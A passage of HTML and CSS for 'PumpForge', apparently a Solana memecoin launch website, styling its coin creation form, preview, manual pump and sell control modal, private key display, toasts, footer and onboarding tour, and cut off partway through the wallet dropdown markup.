            #adv-status-dot.active {
                opacity: 1;
            }

            .slider-field {
                margin-bottom: 24px;
            }
            .slider-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 12px;
            }
            .slider-header label {
                margin-bottom: 0;
                font-weight: 500;
                font-size: 0.9rem;
            }
            .slider-header span {
                font-weight: 500;
                color: var(--accent-green);
            }

            .custom-slider {
                -webkit-appearance: none;
                width: 100%;
                height: 6px;
                border-radius: 3px;
                background: var(--border-color-light);
                outline: none;
                transition: opacity 0.2s;
                cursor: pointer;
            }
            .custom-slider::-webkit-slider-thumb {
                -webkit-appearance: none;
                appearance: none;
                width: 20px;
                height: 20px;
                border-radius: 50%;
                background: var(--accent-green);
                border: 3px solid var(--background-secondary);
                cursor: pointer;
                margin-top: -7px;
                transition: transform 0.2s ease;
            }
            .custom-slider::-moz-range-thumb {
                width: 20px;
                height: 20px;
                border-radius: 50%;
                background: var(--accent-green);
                border: 3px solid var(--background-secondary);
                cursor: pointer;
            }
            .custom-slider:hover::-webkit-slider-thumb {
                transform: scale(1.1);
            }

            .summary-display {
                background-color: rgba(37, 195, 142, 0.1);
                border: 1px solid rgba(37, 195, 142, 0.2);
                color: #fff;
                padding: 12px 16px;
                border-radius: 8px;
                margin: 8px 0;
            }
            .summary-row {
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .summary-row span:first-child {
                font-size: 0.9rem;
                color: var(--text-secondary);
            }
            .summary-row span:last-child {
                font-weight: 600;
                font-size: 1rem;
                color: var(--accent-green);
            }
            #total-cost-display {
                background-color: transparent;
                border: 1px solid var(--border-color);
                margin-top: 16px;
            }
            #total-cost-display span:last-child {
                color: var(--text-primary);
            }

            .preview-container h2 {
                font-size: 1.25rem;
                margin-bottom: 16px;
                font-weight: 600;
            }
            .preview-box {
                background-color: #101010;
                border-radius: 16px;
                width: 100%;
                aspect-ratio: 4 / 5;
                max-width: 450px;
                margin-left: auto;
                margin-right: auto;
                display: flex;
                align-items: center;
                justify-content: center;
                text-align: center;
                position: relative;
                overflow: hidden;
                box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.5);
                z-index: 0;
                border: 1px solid transparent;
            }
            .preview-box::before {
                content: "";
                position: absolute;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: -1;
                margin: -1px;
                border-radius: inherit;
                background: linear-gradient(
                    to bottom,
                    rgba(37, 195, 142, 0.3),
                    rgba(37, 195, 142, 0.05)
                );
            }

            .preview-box .media-preview {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
            .preview-overlay {
                position: absolute;
                bottom: 0;
                left: 0;
                right: 0;
                padding: 20px;
                background: linear-gradient(
                    180deg,
                    transparent 0%,
                    rgba(10, 10, 10, 0.8) 50%,
                    #0a0a0a 100%
                );
                color: white;
                text-align: left;
                opacity: 1;
                transition: opacity 0.3s ease-in-out;
            }
            .preview-text-content {
                padding-top: 40px;
            }
            .preview-header {
                display: flex;
                align-items: baseline;
                gap: 8px;
                margin-bottom: 8px;
            }
            #preview-name {
                font-size: 1.75rem;
                font-weight: 700;
            }
            #preview-ticker {
                font-size: 1rem;
                font-weight: 500;
                color: var(--accent-green);
                text-transform: uppercase;
            }
            #preview-description {
                font-size: 0.9rem;
                color: #ccc;
                line-height: 1.5;
                display: -webkit-box;
                -webkit-line-clamp: 2;
                -webkit-box-orient: vertical;
                overflow: hidden;
            }

            #preview-box-content {
                display: none;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                color: var(--text-secondary);
                padding: 20px;
                transition: opacity 0.3s ease;
            }
            #preview-box-content .icon {
                stroke: var(--border-color-light);
                margin-bottom: 16px;
            }
            #preview-box-content span {
                font-weight: 500;
            }

            .create-coin-btn-main {
                width: 100%;
                background-color: var(--accent-green);
                color: #000;
                font-size: 1rem;
                font-weight: 700;
                padding: 16px;
                border-radius: 8px;
                border: none;
                cursor: pointer;
                margin-top: 24px;
                transition: all 0.2s ease;
            }
            .create-coin-btn-main:hover:not(:disabled) {
                background-color: var(--accent-green-hover);
            }

            .create-coin-btn-main:disabled {
                background-color: rgba(37, 195, 142, 0.1);
                color: #111111;
                cursor: not-allowed;
            }

            /* --- [REVISED] Modern Styles for Manual Control Panel --- */
            /* --- [NEW] Styles for Loading Modal --- */
            /* --- [REVISED] High-End Loading Modal Styles --- */
            /* --- UPDATED LOADING MODAL STYLES --- */

            .loading-box {
                background-color: #0a0a0a;
                background: linear-gradient(
                    180deg, 
                    rgba(24, 24, 27, 0.95) 0%, 
                    rgba(10, 10, 10, 0.98) 100%
                );
                border: 1px solid var(--border-color);
                border-top: 1px solid var(--accent-green); /* Subtle top highlight */
                box-shadow: 
                    0 20px 50px rgba(0, 0, 0, 0.5),
                    0 0 30px rgba(37, 195, 142, 0.1); /* Green ambient glow */
                border-radius: 16px;
                width: 90%;
                max-width: 400px;
                padding: 48px 32px;
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
                position: relative;
                overflow: hidden;
            }

            /* Optional: Scanline effect for extra "tech" feel */
            .loading-box::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 1px;
                background: linear-gradient(90deg, transparent, var(--accent-green), transparent);
                opacity: 0.3;
                animation: scanline 2s linear infinite;
            }

            @keyframes scanline {
                0% { transform: translateY(0); opacity: 0; }
                50% { opacity: 0.5; }
                100% { transform: translateY(400px); opacity: 0; }
            }

            .spinner {
                width: 48px;
                height: 48px;
                border: 3px solid rgba(255, 255, 255, 0.1);
                border-top-color: var(--accent-green);
                border-right-color: var(--accent-green); /* Dual color spin for better visual */
                border-radius: 50%;
                animation: spin 0.8s cubic-bezier(0.55, 0.055, 0.675, 0.19) infinite;
                margin-bottom: 28px;
                box-shadow: 0 0 15px rgba(37, 195, 142, 0.2);
            }

            .loading-box h2 {
                font-size: 1.25rem;
                font-weight: 600;
                color: var(--text-primary);
                margin-bottom: 12px;
                letter-spacing: 0.5px;
            }

            .loading-box p {
                color: var(--accent-green); /* Green text looks like terminal output */
                font-family: "Courier New", Courier, monospace; /* Monospace for tech feel */
                font-size: 0.9rem;
                line-height: 1.5;
                background: rgba(37, 195, 142, 0.05);
                padding: 8px 12px;
                border-radius: 6px;
                border: 1px dashed rgba(37, 195, 142, 0.2);
                min-width: 80%;
            }

            @keyframes spin {
                to { transform: rotate(360deg); }
            }
            /* --- [NEW & REFINED] Styles for Manual Control Panel --- */
            /* --- [FINAL] Themed Styles for Manual Control Panel --- */
            /* --- [FINAL THEMED] Styles for Manual Control MODAL --- */
            #manual-control-modal.open {
                opacity: 1;
                visibility: visible;
                backdrop-filter: blur(8px); /* The blur effect */
            }

            #manual-control-modal.open .control-modal-box {
                transform: scale(1);
            }

            .control-modal-box {
                /* Themed background and border to match .form-section */
                background: linear-gradient(
                    rgba(37, 195, 142, 0.05),
                    rgba(37, 195, 142, 0)
                );
                border: 1px solid rgba(37, 195, 142, 0.2);
                border-radius: 12px;
                padding: 24px;

                /* Standard modal properties */
                width: 90%;
                max-width: 420px; /* Matching other modals */
                display: flex;
                flex-direction: column;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                transform: scale(0.95); /* For the pop-in animation */
                transition: transform 0.3s ease;
            }

            .control-modal-box h2 {
                /* Themed title style to match .form-section h2 */
                color: var(--accent-green);
                margin-bottom: 24px;
                font-size: 1.25rem;
                font-weight: 600;
                text-align: left;
                padding-bottom: 0;
                border-bottom: none;
            }

            .control-section {
                margin-bottom: 24px;
            }
            .control-section:last-child {
                margin-bottom: 0;
            }

            .control-section label {
                display: block;
                margin-bottom: 10px;
                font-weight: 500;
                font-size: 0.9rem;
                color: var(--text-primary);
            }

            .control-description {
                font-size: 0.85rem;
                color: var(--text-secondary);
                line-height: 1.4;
                margin-top: -4px; /* Adjust to align with label */
                margin-bottom: 16px;
            }

            .pump-link {
                display: flex;
                align-items: center;
                justify-content: space-between;
                background-color: transparent;
                border: 1px solid var(--border-color);
                border-radius: 8px;
                padding: 12px 14px;
                text-decoration: none;
                color: var(--text-primary);
                font-weight: 500;
                transition: all 0.2s ease;
            }

            .pump-link:hover {
                border-color: var(--accent-green);
            }

            .pump-control-area {
                text-align: center;
            }

            .pump-one-btn {
                width: 100%;
                background: var(--accent-green);
                border: none;
                border-radius: 8px;
                padding: 14px;
                font-size: 1rem;
                font-weight: 700;
                color: #000;
                cursor: pointer;
                transition: all 0.2s ease-in-out;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }

            .pump-one-btn:hover:not(:disabled) {
                background-color: var(--accent-green-hover);
            }

            .pumps-remaining-display {
                font-weight: 500;
                color: var(--text-secondary);
                margin-top: 12px;
                font-size: 0.9rem;
            }

            .sell-controls {
                margin-top: auto; /* Pushes to bottom in flex container */
            }

            .sell-btn-group {
                display: flex;
                gap: 12px;
            }

            .sell-btn {
                flex: 1;
                font-size: 0.95rem;
                font-weight: 600;
                padding: 12px;
                border-radius: 8px;
                border: 1px solid transparent;
                cursor: pointer;
                transition: all 0.2s ease;
            }

            .sell-btn.dev-sell {
                background-color: var(--background-tertiary);
                border-color: var(--border-color);
                color: var(--text-primary);
            }

            .sell-btn.dev-sell:hover:not(:disabled) {
                background-color: #2a2a2d;
                border-color: var(--border-color-light);
            }

            .sell-btn.all-sell {
                background-color: rgba(229, 72, 77, 0.15);
                border-color: rgba(229, 72, 77, 0.4);
                color: #e5484d;
            }

            .sell-btn.all-sell:hover:not(:disabled) {
                background-color: #e5484d;
                color: #fff;
            }

            .sell-btn:disabled,
            .pump-one-btn:disabled {
                background-color: var(--background-tertiary) !important;
                color: var(--text-tertiary) !important;
                border-color: var(--border-color) !important;
                cursor: not-allowed;
                transform: none;
                box-shadow: none;
            }

            /* --- Professional Toast Notifications --- */
            #toast-container {
                position: fixed;
                bottom: 20px;
                right: 20px;
                z-index: 2000;
                display: flex;
                flex-direction: column;
                gap: 12px;
            }

            .toast {
                display: flex;
                align-items: center;
                gap: 12px;
                padding: 14px 20px;
                background-color: var(--background-secondary);
                border: 1px solid var(--border-color);
                border-left: 4px solid var(--text-tertiary);
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
                font-weight: 500;
                transform: translateX(calc(100% + 20px));
                opacity: 0;
                transition:
                    transform 0.5s cubic-bezier(0.25, 1, 0.5, 1),
                    opacity 0.5s ease;
            }

            .toast.show {
                transform: translateX(0);
                opacity: 1;
            }

            .toast .icon {
                width: 22px;
                height: 22px;
                flex-shrink: 0;
            }

            .toast.success {
                border-left-color: var(--accent-green);
            }
            .toast.success .icon {
                stroke: var(--accent-green);
            }

            .toast.error {
                border-left-color: #e5484d;
            }
            .toast.error .icon {
                stroke: #e5484d;
            }

            .toast.info {
                border-left-color: #3b82f6;
            }
            .toast.info .icon {
                stroke: #3b82f6;
            }

            /* --- Enhanced Private Key Display --- */
            #private-key-container {
                flex-direction: column;
                align-items: flex-start;
                padding: 0;
                overflow: hidden;
            }
            #private-key-toggle {
                display: flex;
                align-items: center;
                gap: 12px;
                padding: 12px;
                width: 100%;
                cursor: pointer;
                border-radius: 6px;
            }
            #private-key-container:hover #private-key-toggle {
                background-color: #252525;
            }

            #private-key-display {
                display: none; /* Initially hidden */
                align-items: center;
                justify-content: space-between;
                width: calc(100% - 16px);
                margin: 0 8px 8px 8px;
                padding: 8px 12px;
                background-color: var(--background-primary);
                border: 1px solid var(--border-color);
                border-radius: 6px;
            }
            #private-key-text {
                font-family: "Courier New", Courier, monospace;
                font-size: 0.85rem;
                color: var(--text-secondary);
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            #copy-pk-btn {
                background: none;
                border: none;
                cursor: pointer;
                padding: 4px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 4px;
            }
            #copy-pk-btn:hover {
                background-color: #333;
            }
            #copy-pk-btn .icon {
                stroke: var(--text-secondary);
                width: 16px;
                height: 16px;
            }
            /* --- Generic Content Styles for Info Pages --- */
            .content-box {
                background-color: var(--background-secondary);
                border: 1px solid var(--border-color);
                border-radius: 12px;
                padding: 32px;
                margin-bottom: 24px;
            }
            .content-box h2 {
                color: var(--accent-green);
                margin-bottom: 16px;
                font-size: 1.5rem;
                border-bottom: 1px solid var(--border-color);
                padding-bottom: 16px;
            }
            .content-box p {
                color: var(--text-secondary);
                line-height: 1.7;
                margin-bottom: 16px;
            }
            .content-box ul {
                list-style-position: inside;
                color: var(--text-secondary);
                line-height: 1.8;
                padding-left: 8px;
            }
            .content-box strong {
                color: var(--text-primary);
                font-weight: 600;
            }
            .step-item {
                display: flex;
                gap: 24px;
                align-items: flex-start;
                margin-bottom: 32px;
            }
            .step-number {
                flex-shrink: 0;
                width: 48px;
                height: 48px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 50%;
                background-color: rgba(37, 195, 142, 0.1);
                border: 1px solid rgba(37, 195, 142, 0.3);
                font-size: 1.25rem;
                font-weight: 700;
                color: var(--accent-green);
            }
            .step-content h3 {
                font-size: 1.2rem;
                font-weight: 600;
                margin-bottom: 8px;
            }
            .fees-table {
                width: 100%;
                border-collapse: collapse;
            }
            .fees-table th,
            .fees-table td {
                padding: 16px;
                text-align: left;
                border-bottom: 1px solid var(--border-color);
            }
            .fees-table th {
                color: var(--text-secondary);
                font-weight: 500;
            }
            .fees-table td:last-child {
                font-weight: 600;
                color: var(--accent-green);
            }

            .app-footer {
                width: 100%;
                background-color: var(--background-primary);
                border-top: 1px solid var(--border-color);
                padding: 40px var(--container-padding) 20px;
                margin-top: 60px;
            }
            .footer-container {
                max-width: 1440px;
                margin: 0 auto;
            }
            .footer-main {
                display: flex;
                flex-wrap: wrap;
                justify-content: space-between;
                gap: 40px;
                margin-bottom: 40px;
            }
            .footer-brand {
                max-width: 250px;
            }
            .footer-brand .header-logo {
                margin-bottom: 16px;
            }
            .footer-brand p {
                font-size: 0.9rem;
                color: var(--text-secondary);
                line-height: 1.5;
            }
            .footer-links {
                display: flex;
                flex-wrap: wrap;
                gap: 60px;
            }
            .footer-column h4 {
                font-size: 1rem;
                font-weight: 600;
                margin-bottom: 16px;
                color: var(--text-primary);
            }
            .footer-column ul {
                list-style: none;
            }
            .footer-column ul li {
                margin-bottom: 10px;
            }
            .footer-column ul li a {
                color: var(--text-secondary);
                text-decoration: none;
                font-size: 0.9rem;
                transition: color 0.2s ease;
            }
            .footer-column ul li a:hover {
                color: var(--accent-green);
            }
            .footer-bottom-bar {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding-top: 20px;
                border-top: 1px solid var(--border-color);
                font-size: 0.85rem;
                color: var(--text-secondary);
                flex-wrap: wrap;
                gap: 16px;
            }
            .social-links {
                display: flex;
                gap: 16px;
            }
            .social-links a {
                color: var(--text-secondary);
                text-decoration: none;
            }
            .social-links a:hover .icon {
                stroke: var(--accent-green);
            }

            /* --- Mobile Menu Button --- */
            #mobile-menu-toggle {
                display: none;
                flex-direction: column;
                justify-content: space-around;
                width: 24px;
                height: 24px;
                background: transparent;
                border: none;
                cursor: pointer;
                padding: 0;
                z-index: 100;
            }
            #mobile-menu-toggle .bar {
                width: 24px;
                height: 2px;
                background-color: var(--text-secondary);
                border-radius: 2px;
                transition: all 0.3s ease-in-out;
            }
            #mobile-menu-toggle.open .bar1 {
                transform: rotate(45deg) translate(5px, 5px);
            }
            #mobile-menu-toggle.open .bar2 {
                opacity: 0;
            }
            #mobile-menu-toggle.open .bar3 {
                transform: rotate(-45deg) translate(5px, -5px);
            }

            @media (max-width: 1024px) {
                :root {
                    --container-padding: 20px;
                }
                .form-container-wrapper {
                    flex-direction: column;
                }
                .preview-container {
                    position: static;
                    top: 0;
                    margin-top: 20px;
                    width: 100%;
                }
            }
            @media (max-width: 768px) {
                .header-nav {
                    display: flex;
                    flex-direction: column;
                    position: absolute;
                    top: 73px;
                    left: 0;
                    right: 0;
                    background-color: var(--background-primary);
                    border-bottom: 1px solid var(--border-color);
                    padding: 0 20px 20px;
                    gap: 0;
                    overflow: hidden;
                    max-height: 0;
                    opacity: 0;
                    transition:
                        max-height 0.4s ease-in-out,
                        opacity 0.3s ease-in-out,
                        transform 0.4s ease-in-out;
                    transform: translateY(-10px);
                    z-index: 99;
                }
                .header-nav.mobile-open {
                    max-height: 500px;
                    opacity: 1;
                    transform: translateY(0);
                }
                .header-nav a {
                    padding: 16px 0;
                }
                .header-nav a.active-nav::after {
                    content: none;
                } /* Remove bottom bar on mobile */

                #mobile-menu-toggle {
                    display: flex;
                }

                .form-header h1,
                .page-header h1 {
                    font-size: 1.75rem;
                }
                .input-group {
                    flex-direction: column;
                    gap: 0;
                }
                .input-field:not(:last-child) {
                    margin-bottom: 24px;
                }
                .footer-main {
                    flex-direction: column;
                }
                .footer-bottom-bar {
                    flex-direction: column-reverse;
                    align-items: flex-start;
                }
                    /* Tighten the gap between elements */
                .header-right {
                    gap: 6px;
                }

                /* Make the Withdraw button compact */
                .withdraw-btn {
                    padding: 8px 10px;
                    font-size: 0.85rem;
                }

                /* Compact User Menu Toggle */
                .user-menu-toggle {
                    padding: 6px 8px;
                }

                /* HIDE the wallet text/address on mobile (Icon is enough) */
                #wallet-status-text {
                    display: none;
                }

                /* Adjust balance display to fit */
                .header-balance {
                    padding-left: 6px;
                    font-size: 0.8rem;
                }
                
                /* Ensure the icon stays visible and sized correctly */
                .wallet-info-header {
                    padding-right: 0;
                    gap: 0;
                }
                
                .wallet-info-header .icon {
                    margin-right: 0;
                }
                    /* Optional: Hide the dropdown arrow on mobile to save more space */
                .user-menu .dropdown-arrow {
                    display: none;
                }
            }
            /* --- DARK MODE ONBOARDING TOUR STYLES --- */
            .tour-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                /* Reduced opacity to 0.6 so the site is visible but dimmed */
                background-color: rgba(0, 0, 0, 0.6); 
                z-index: 9990;
                opacity: 0;
                visibility: hidden;
                transition: opacity 0.4s ease;
                /* Reduced blur to 2px for a subtle "glass" effect */
                backdrop-filter: blur(2px); 
            }

            .tour-overlay.active {
                opacity: 1;
                visibility: visible;
            }

            .tour-highlight {
                position: relative !important;
                z-index: 9999 !important;
                background-color: #000 !important; /* Pure black bg for contrast */
                box-shadow: 0 0 0 1px var(--accent-green), 0 0 40px rgba(37, 195, 142, 0.2) !important;
                border-radius: 8px;
                pointer-events: auto !important;
                cursor: pointer !important;
            }

            /* The Themed Tooltip Box */
            /* Update this specific class in your CSS */
            .tour-tooltip {
                position: absolute;
                width: 320px;
                background-color: #111;
                border: 1px solid var(--border-color);
                border-left: 4px solid var(--accent-green);
                color: #fff;
                padding: 24px;
                border-radius: 8px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.8);
                
                /* FIX: Set this higher than the dropdown's 10001 */
                z-index: 11000 !important; 
                
                opacity: 0;
                transform: translateY(10px);
                transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
                pointer-events: none;
            }

            .tour-tooltip.visible {
                opacity: 1;
                transform: translateY(0);
            }

            .tour-tooltip h3 {
                font-size: 1rem;
                font-weight: 700;
                margin-bottom: 12px;
                color: var(--accent-green);
                display: flex;
                align-items: center;
                gap: 10px;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }

            .tour-tooltip p {
                font-size: 0.9rem;
                line-height: 1.6;
                color: var(--text-secondary);
                margin-bottom: 0;
            }

            /* Dark Arrow */
            .tour-arrow {
                position: absolute;
                width: 14px;
                height: 14px;
                background: #111; /* Match tooltip bg */
                border-top: 1px solid var(--border-color); /* Match border */
                border-left: 1px solid var(--border-color);
                transform: rotate(45deg);
                z-index: 10001;
            }

            body.tour-active {
                overflow: hidden;
            }
            /* Add this to your CSS */
            /* UPDATED CSS - Add/Replace this in your <style> */
            .input-helper {
                font-size: 0.8rem;
                color: var(--text-tertiary); /* Uniform gray color */
                margin-top: 6px;
                line-height: 1.4;
                font-weight: 400; /* Regular weight to reduce distraction */
            }
            /* This ensures bold text is just bold, not brighter */
            .input-helper strong {
                color: inherit; 
                font-weight: 600;
            }
            .input-helper a {
                color: var(--accent-green); /* Links still need to look clickable */
                text-decoration: none;
                border-bottom: 1px dotted var(--accent-green);
            }
            .input-helper a:hover {
                border-bottom-style: solid;
            }
            .badge-recommended {
                background: rgba(255, 184, 0, 0.1);
                color: #ffb800;
                font-size: 0.7rem;
                padding: 2px 6px;
                border-radius: 4px;
                margin-left: 6px;
                border: 1px solid rgba(255, 184, 0, 0.2);
            }
            .section-footer-link {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 6px;
                margin-top: 24px;
                padding-top: 16px;
                border-top: 1px solid var(--border-color);
                font-size: 0.85rem;
                color: var(--text-secondary);
                text-decoration: none;
                transition: color 0.2s;
            }
            .section-footer-link:hover {
                color: var(--accent-green);
            }
            /* Add/Update these in your <style> block */
            .pro-tip-box {
                background: rgba(37, 195, 142, 0.08);
                border-left: 3px solid var(--accent-green);
                padding: 16px;
                border-radius: 0 8px 8px 0;
                margin-top: 20px;
                font-size: 0.9rem;
            }
            .pro-tip-header {
                display: flex;
                align-items: center;
                gap: 8px;
                font-weight: 700;
                color: var(--accent-green);
                margin-bottom: 8px;
                text-transform: uppercase;
                font-size: 0.8rem;
                letter-spacing: 0.5px;
            }
            .resource-links {
                display: flex;
                gap: 12px;
                margin-top: 12px;
                flex-wrap: wrap;
            }
            .resource-pill {
                background: var(--background-secondary);
                border: 1px solid var(--border-color);
                padding: 6px 12px;
                border-radius: 20px;
                font-size: 0.8rem;
                color: var(--text-secondary);
                text-decoration: none;
                transition: all 0.2s ease;
                display: flex;
                align-items: center;
                gap: 6px;
            }
            .resource-pill:hover {
                border-color: var(--accent-green);
                color: var(--text-primary);
            }
        </style>
    </head>
    <!-- Add this right before </body> -->
    <div id="toast-container"></div>
    <body>
        <svg width="0" height="0" style="position: absolute">
            <defs>
                <!-- Add this inside the <defs> tag -->
                <symbol
                    id="icon-solana"
                    viewBox="0 0 42 35"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                >
                    <path
                        d="M6.015 34.25H0l15.75-15.75h6.015L6.015 34.25zM21.765 0h6.015L6.015 21.765h-6.015L21.765 0zM35.985 0l-15.75 15.75h6.015L42 5.25V0h-6.015zM20.235 21.765L26.25 15.75v10.5l-6.015 6.015h-6.015l6.015-10.5z"
                        fill="currentColor"
                    />
                </symbol>

                <!-- Add these inside the <defs> tag -->
                <symbol
                    id="icon-check-circle"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                >
                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
                </symbol>
                <symbol
                    id="icon-alert-triangle"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                >
                    <path
                        d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
                    ></path>
                    <line x1="12" y1="9" x2="12" y2="13"></line>
                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
                </symbol>
                <symbol
                    id="icon-info-circle"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                >
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="16" x2="12" y2="12"></line>
                    <line x1="12" y1="8" x2="12.01" y2="8"></line>
                </symbol>
                <symbol id="icon-arrow-down" viewBox="0 0 24 24">
                    <polyline points="6 9 12 15 18 9"></polyline>
                </symbol>
                <symbol id="icon-image" viewBox="0 0 24 24">
                    <rect
                        x="3"
                        y="3"
                        width="18"
                        height="18"
                        rx="2"
                        ry="2"
                    ></rect>
                    <circle cx="8.5" cy="8.5" r="1.5"></circle>
                    <polyline points="21 15 16 10 5 21"></polyline>
                </symbol>
                <symbol id="icon-file" viewBox="0 0 24 24">
                    <path
                        d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"
                    ></path>
                    <polyline points="13 2 13 9 20 9"></polyline>
                </symbol>
                <symbol id="icon-aspect-ratio" viewBox="0 0 24 24">
                    <path
                        d="M12.001 5.999L18 12l-5.999 6.001M6.001 5.999L12 12l-5.999 6.001"
                    ></path>
                </symbol>
                <symbol id="icon-link" viewBox="0 0 24 24">
                    <path
                        d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7-7.07l-1.72 1.72M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.72-1.72"
                    ></path>
                </symbol>
                <symbol id="icon-wallet" viewBox="0 0 24 24">
                    <path
                        d="M21 12V7H5a2 2 0 0 1 0-4h14v4h-2m-4-6H3a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h18a1 1 0 0 0 1-1V9M16 13.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0z"
                    ></path>
                </symbol>
                <symbol id="icon-sliders" viewBox="0 0 24 24">
                    <path
                        d="M4 21v-7M4 10V3M12 21v-9M12 8V3M20 21v-5M20 12V3M1 14h6M9 8h6M17 16h6"
                    ></path>
                </symbol>
                <symbol id="icon-forge" viewBox="0 0 24 24">
                    <path
                        d="M9.1,4.1,5.3,1.3a1,1,0,0,0-1.4,0L1.3,3.9a1,1,0,0,0,0,1.4l10,10a1,1,0,0,0,.7.3,1,1,0,0,0,.7-.3l2.8-2.8,2.1,2.1,2.8-2.8L17.6,10l-2.1-2.1,2.8-2.8a1,1,0,0,0,0-1.4ZM11.4,13.8l-1-1L13.6,9.6l1,1ZM5,18H9.4l4.3-4.3-4.3-4.3H5a1,1,0,0,0-1,1v6.6A1,1,0,0,0,5,18Z"
                    />
                    <path
                        d="M22.7,16.5,20.9,14l-4.3,4.3,1.8,2.5a1,1,0,0,0,1.4.2l2.7-1.9A1,1,0,0,0,22.7,16.5Z"
                    />
                </symbol>
                <symbol
                    id="icon-twitter-x"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1.5"
                >
                    <path
                        d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"
                    />
                </symbol>
                <symbol
                    id="icon-telegram"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1.5"
                >
                    <path d="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7Z" />
                </symbol>
                <symbol id="icon-key" viewBox="0 0 24 24">
                    <path
                        d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"
                    ></path>
                </symbol>
                <symbol id="icon-copy" viewBox="0 0 24 24">
                    <rect
                        x="9"
                        y="9"
                        width="13"
                        height="13"
                        rx="2"
                        ry="2"
                    ></rect>
                    <path
                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                    ></path>
                </symbol>
                <symbol id="icon-x" viewBox="0 0 24 24">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                </symbol>
            </defs>
        </svg>
        <div class="app-container">
            <header class="main-header">
                <div class="header-left">
                    <!-- New Brand Structure -->
                    <a href="#" id="logo-link" class="header-brand-container">
                        <!-- Icon sits on the left -->
                        <svg class="icon logo-icon">
                            <use xlink:href="#icon-forge"></use>
                        </svg>
                        
                        <!-- Text stacks on the right -->
                        <div class="brand-text-stack">
                            <span class="brand-name">PumpForge</span>
                            <span class="brand-tagline">Launch with an edge</span>
                        </div>
                    </a>
                
                    <!-- Navigation -->
                    <nav class="header-nav" id="main-nav">
                        <a href="#create" data-page="create-coin-section" class="nav-link active-nav">Create Coin</a>
                        <a href="#about" data-page="about-section" class="nav-link">About</a>
                        <a href="#how-it-works" data-page="how-it-works-section" class="nav-link">How It Works</a>
                        <a href="#fees" data-page="fees-section" class="nav-link">Fees</a>
                    </nav>
                </div>
                <div class="header-right">
                    <div class="user-menu" id="user-menu">
                        <!-- This is the NEW header section -->
                        <div class="user-menu-toggle" id="user-menu-toggle">
                            <span class="status-dot"></span>
                            <div class="wallet-info-header">
                                <svg class="icon">
                                    <use xlink:href="#icon-wallet"></use>
                                </svg>
                                <span id="wallet-status-text"
                                    >Create Wallet</span
                                >
                            </div>
                            <div
                                class="header-balance"
                                id="header-balance-display"
                            >
                                <!-- Balance will be inserted here by JS -->
                            </div>
                            <svg
                                class="icon dropdown-arrow"
                                style="
                                    width: 16px;
                                    height: 16px;
                                    margin-left: 8px;
                                "
                            >
                                <use xlink:href="#icon-arrow-down"></use>
                            </svg>
                        </div>
                        <div class="wallet-dropdown" id="wallet-dropdown">
                            <!-- Section 1: Balance & Network -->
                            <div class="dropdown-section">
                                <div class="wallet-header-row">
                                    <div class="network-badge">
                                        <span class="network-dot"></span>
                                        Mainnet
                                    </div>
                                    <div class="wallet-address-short" id="wallet-address-short-display" style="font-family: monospace; color: var(--text-tertiary);">
                                        Not connected
                                    </div>
                                </div>
                                <div class="wallet-balance-large" id="wallet-balance-display">
                                    0.00 SOL
                                </div>
                                
                                <!-- Quick Actions -->
                                <div class="wallet-actions-grid">
                                    <div class="action-btn-small" id="copy-address-btn">
                                        <svg class="icon" style="width:16px;height:16px;"><use xlink:href="#icon-copy"></use></svg>
